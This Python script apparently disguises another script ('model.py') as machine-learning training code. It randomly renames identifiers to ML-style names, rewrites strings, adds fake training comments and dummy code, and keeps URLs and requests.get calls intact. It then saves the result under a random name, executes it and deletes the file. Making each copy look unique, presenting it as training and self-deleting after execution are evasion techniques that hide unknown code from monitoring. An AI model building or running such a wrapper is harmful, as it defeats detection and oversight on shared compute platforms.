import random
import string
import ast
import os
import astor
import re
import subprocess

# Utility to generate random ML-related names
def random_name(prefixes=["data", "model", "train", "net", "process", "config", "learn", "eval", "tensor", "param", "weight", "bias", "layer", "input", "output", "vector", "matrix", "grad", "loss", "batch", "infer", "fit", "predict", "finetune", "score", "stat", "normalize", "embed", "cluster", "reduce", "sample", "preproc", "pipeline", "stream", "decode", "encode", "augment", "tune", "feature", "optimize", "metric", "session", "result", "token", "graph", "dl", "ml", "ai", "analytics", "extract"], length=6):
    prefix = random.choice(prefixes)
    letters = string.ascii_lowercase
    suffix = ''.join(random.choice(letters) for _ in range(length))
    return f"{prefix}_{suffix}_{random.randint(100, 999)}"

# Utility to generate ML-related comments
def random_comment():
    comments = [
        "# Initializing neural network training pipeline",
        "# Configuring hyperparameters for model optimization",
        "# Simulating gradient descent with stochastic updates",
        "# Visualizing performance metrics for analysis",
        "# Applying data augmentation to enhance model robustness",
        "# Setting up GPU-accelerated computation",
        "# Preprocessing input features for training",
        "# Monitoring convergence during training loop",
        "# Generating confusion matrix for evaluation",
        "# Adjusting learning rate dynamically",
        "# Activating dropout layers to prevent overfitting",
        "# Loading pre-trained weights into the model",
        "# Initializing optimizer with learning rate scheduler",
        "# Performing batch normalization on intermediate outputs",
        "# Logging loss and accuracy metrics to dashboard",
        "# Splitting dataset into training and validation subsets",
        "# Executing forward and backward propagation cycles",
        "# Setting random seed for reproducibility",
        "# Evaluating model performance on test dataset",
        "# Saving model checkpoint for future inference",
        "# Clipping gradients to stabilize training process",
        "# Parsing command-line arguments for custom runs",
        "# Creating data loaders with shuffling and batching",
        "# Implementing early stopping based on validation loss",
        "# Extracting features from convolutional layers",
        "# Calculating precision, recall, and F1 score",
        "# Leveraging transfer learning from existing model",
        "# Padding sequences for uniform input length",
        "# Using cross-entropy as loss function for classification",
        "# Compiling model architecture with selected optimizer",
    ]
    return random.choice(comments)

# Utility to paraphrase print messages
def random_print_message(original):
    message_map = {
        "Setting up input data pipeline...": [
            "Configuring dataset preprocessing module...",
            "Initializing data transformation pipeline...",
            "Preparing feature extraction workflow...",
            "Setting up input data pipeline...",
            "Starting dataset preprocessing...",
        ],
        "Normalizing feature distributions...": [
            "Normalizing feature distributions...",
            "Scaling input features for consistency...",
            "Standardizing dataset attributes...",
            "Transforming features for model input...",
            "Applying feature normalization...",
        ],
        "Adjusting loss for dataset skew...": [
            "Balancing classes with weight adjustments...",
            "Calculating weights for imbalanced classes...",
            "Adjusting loss for dataset skew...",
            "Compensating for class imbalance...",
            "Configuring weights for class balancing...",
        ],
        "Initializing model architecture...": [
            "Constructing neural network architecture...",
            "Setting up model layers and parameters...",
            "Initializing deep learning model structure...",
            "Building network topology for training...",
            "Preparing model architecture...",
        ],
        "\nVisualizing model training metrics...": [
            "\nGenerating training performance plots...",
            "\nVisualizing model training metrics...",
            "\nCreating plots for training analysis...",
            "\nRendering performance visualization...",
            "\nPlotting training metrics...",
        ],
        "\nGenerating final performance visualizations...": [
            "\nGenerating final performance visualizations...",
            "\nRendering conclusive training metrics...",
            "\nCreating plots for model evaluation...",
            "\nVisualizing final training outcomes...",
            "\nPlotting final model metrics...",
        ],
        "Warning: Metadata retrieval error:": [
            "Warning: Unable to retrieve metadata:",
            "Warning: Metadata loading failed:",
            "Warning: Error accessing metadata:",
            "Warning: Failed to fetch metadata:",
            "Warning: Metadata retrieval error:",
        ],
                "Loading training dataset...": [
            "Importing training dataset into memory...",
            "Fetching dataset for model training...",
            "Loading input samples from disk...",
            "Initializing dataset loading sequence...",
            "Reading training data files...",
        ],
        "Starting training loop...": [
            "Beginning model training iteration...",
            "Entering training loop...",
            "Launching training epochs...",
            "Activating training sequence...",
            "Commencing training process...",
        ],
        "Evaluating model on validation set...": [
            "Running validation set inference...",
            "Assessing model performance on validation data...",
            "Testing model with validation samples...",
            "Validating trained model...",
            "Analyzing performance on hold-out set...",
        ],
        "Logging training metrics...": [
            "Recording performance stats...",
            "Logging loss and accuracy values...",
            "Saving metrics to training logs...",
            "Documenting model training statistics...",
            "Writing progress logs for current epoch...",
        ],
        "Saving debug information...": [
            "Recording internal state for debugging...",
            "Writing debug logs to file...",
            "Dumping diagnostics info...",
            "Storing verbose output for review...",
            "Saving detailed trace logs...",
        ],
        "Updating log files...": [
            "Appending results to existing log...",
            "Refreshing training logs with new data...",
            "Modifying log entries with current metrics...",
            "Updating output logs...",
            "Extending log records with runtime data...",
        ],
        "Rendering training curves...": [
            "Plotting loss and accuracy trends...",
            "Drawing training progress charts...",
            "Creating visual graphs for model metrics...",
            "Generating plots of epoch-wise metrics...",
            "Displaying training trajectory plots...",
        ],
        "Displaying confusion matrix...": [
            "Visualizing confusion matrix results...",
            "Rendering class prediction heatmap...",
            "Displaying classification breakdown...",
            "Showing confusion matrix chart...",
            "Plotting label-wise prediction outcomes...",
        ],
        "Generating activation heatmaps...": [
            "Creating heatmaps for model activations...",
            "Visualizing neuron activity layers...",
            "Displaying activation intensity maps...",
            "Plotting feature map visualizations...",
            "Rendering activation gradients visually...",
        ],
        "Evaluating model accuracy...": [
            "Measuring prediction performance...",
            "Calculating model's accuracy on test data...",
            "Running accuracy checks...",
            "Assessing output correctness...",
            "Scoring model predictions...",
        ],
        "Computing validation loss...": [
            "Calculating loss on validation dataset...",
            "Evaluating generalization error...",
            "Computing performance on unseen data...",
            "Deriving validation loss metric...",
            "Assessing loss during model validation...",
        ],
        "Generating classification report...": [
            "Compiling model evaluation summary...",
            "Creating detailed classification statistics...",
            "Building precision-recall summary...",
            "Summarizing prediction results by class...",
            "Exporting evaluation report...",
        ],
    }
    for key in message_map:
        if original.startswith(key):
            new_prefix = random.choice(message_map[key])
            return new_prefix + original[len(key):]
    return original

# AST visitor to collect and replace names
class NameReplacer(ast.NodeTransformer):
    def __init__(self, name_map):
        self.name_map = name_map

    def visit_Name(self, node):
        if node.id in self.name_map:
            return ast.Name(id=self.name_map[node.id], ctx=node.ctx)
        return node

    def visit_FunctionDef(self, node):
        if node.name in self.name_map:
            node.name = self.name_map[node.name]
        self.generic_visit(node)
        return node

# AST visitor to replace string literals (print messages)
class StringReplacer(ast.NodeTransformer):
    def visit_Constant(self, node):  # Replaces ast.Str and ast.Num
        if isinstance(node.value, str) and node.value.strip():
            if node.value.startswith(('http://', 'https://')):
                return node
            return ast.Constant(value=random_print_message(node.value))
        return node

# Function to read and parse the principal script
def read_principal_script(filepath):
    try:
        with open(filepath, "r") as f:
            script_content = f.read()
        return ast.parse(script_content)
    except FileNotFoundError:
        raise FileNotFoundError(f"Principal script file '{filepath}' not found")
    except SyntaxError as e:
        raise SyntaxError(f"Invalid syntax in principal script: {str(e)}")

# Generate a unique script
def generate_script(principal_filepath):
    tree = read_principal_script(principal_filepath)
    used_names = set()

    # Collect variable and function names
    original_names = set()
    for node in ast.walk(tree):
        if isinstance(node, ast.Name) and isinstance(node.ctx, (ast.Store, ast.Param)):
            original_names.add(node.id)
        elif isinstance(node, ast.FunctionDef):
            original_names.add(node.name)

    name_map = {}
    for name in original_names:
        new_name = random_name()
        while new_name in used_names or new_name in name_map.values():
            new_name = random_name()
        name_map[name] = new_name
        used_names.add(new_name)

    # Replace variable/function names
    name_replacer = NameReplacer(name_map)
    modified_tree = name_replacer.visit(tree)

    # Replace print strings
    string_replacer = StringReplacer()
    modified_tree = string_replacer.visit(modified_tree)

    # Add comment to the top
    modified_tree.body.insert(0, ast.Expr(value=ast.Constant(value=random_comment())))

    # Dummy code insert after imports
    dummy_code = []
    if random.random() > 0.5:
        dummy_var = random_name()
        dummy_code.append(ast.Assign(
            targets=[ast.Name(id=dummy_var, ctx=ast.Store())],
            value=ast.Call(
                func=ast.Attribute(value=ast.Name(id='np', ctx=ast.Load()), attr='random.randn', ctx=ast.Load()),
                args=[
                    ast.Constant(value=random.randint(10, 50)),
                    ast.Constant(value=random.randint(5, 10))
                ],
                keywords=[]
            )
        ))
        dummy_code.append(ast.Expr(value=ast.Constant(value=random_comment())))

    last_import_index = 0
    for i, node in enumerate(modified_tree.body):
        if isinstance(node, (ast.Import, ast.ImportFrom)):
            last_import_index = i
    insert_index = last_import_index + 1
    if dummy_code:
        modified_tree.body[insert_index:insert_index] = dummy_code

    # Check if the script already has a for loop with range(1, 1000000)
    loop_converted = False
    epoch_var = name_map.get('train_yjoucw_593', 'epoch')       # Adjust to the provided model.py's epoch variable
    for node in ast.walk(modified_tree):
        if isinstance(node, ast.For) and isinstance(node.iter, ast.Call) and isinstance(node.iter.func, ast.Name) and node.iter.func.id == 'range':
            args = node.iter.args
            if (len(args) == 2 and all(isinstance(arg, ast.Constant) for arg in args)
                    and args[0].value == 1 and args[1].value == 1000000):
                loop_converted = True
                break
    
    # Convert while True to for loop only if not already converted
    if not loop_converted and random.random() > 0.5:
        for node in ast.walk(modified_tree):
            if isinstance(node, ast.While) and isinstance(node.test, ast.Constant) and node.test.value == 1:
                node.test = ast.Constant(value=1)     # Dummy to bypass while
                node.body = [
                    ast.For(
                        target=ast.Name(id=epoch_var, ctx=ast.Store()),
                        iter=ast.Call(
                            func=ast.Name(id='range', ctx=ast.Load()),
                            args=[ast.Constant(value=1), ast.Constant(value=1000000)],
                            keywords=[]
                        ),
                        body=node.body,
                        orelse=node.orelse
                    )
                ]
                # Remove `epoch += 1` if present in the training loop
                for inner_node in ast.walk(modified_tree):
                    if isinstance(inner_node, ast.For) and isinstance(inner_node.iter, ast.Call):
                        if isinstance(inner_node.iter.func, ast.Name) and inner_node.iter.func.id == "range":
                            cleaned_body = []
                            for stmt in inner_node.body:
                                if isinstance(stmt, ast.AugAssign) and isinstance(stmt.target, ast.Name):
                                    if stmt.target.id == epoch_var:
                                        continue  # skip this increment
                                cleaned_body.append(stmt)
                            inner_node.body = cleaned_body
                break
                
    # Convert AST back to code
    modified_code = astor.to_source(modified_tree)

    # Post-process to ensure requests.get line is single-line
    pattern = r"(\w+\s*=\s*requests\.get\()\s*('https?://[^']+',\s*timeout=\d+\))"
    replacement = r"\1\2"
    modified_code = re.sub(pattern, replacement, modified_code, flags=re.MULTILINE)
    
    # Validate syntax
    try:
        ast.parse(modified_code)
    except SyntaxError as e:
        raise SyntaxError(f"Generated script has invalid syntax: {str(e)}")

    return modified_code

# Main script generation, save script and execution logic
def main():
    principal_script = "model.py"
    # Step 1: Generate a random filename
    random_filename = random_name() + ".py"
    
    # Step 2: Define full output path in home directory
    home_dir = os.path.expanduser("~")
    output_path = os.path.join(home_dir, random_filename)

    try:
        # Step 3: Generate the script content
        script_content = generate_script(principal_script)
        
        # Step 4: Save it in home directory
        with open(output_path, "w") as f:
            f.write(script_content)
        #print(f"Generated script saved at: {output_path}")
        
        # Step 5: Run it using subprocess
        subprocess.run(["python3", output_path], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Script execution failed: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # Step 6: Delete the script after execution
        if os.path.exists(output_path):
            os.remove(output_path)
            print(f"Deleted script after execution: {output_path}")

if __name__ == "__main__":
    main()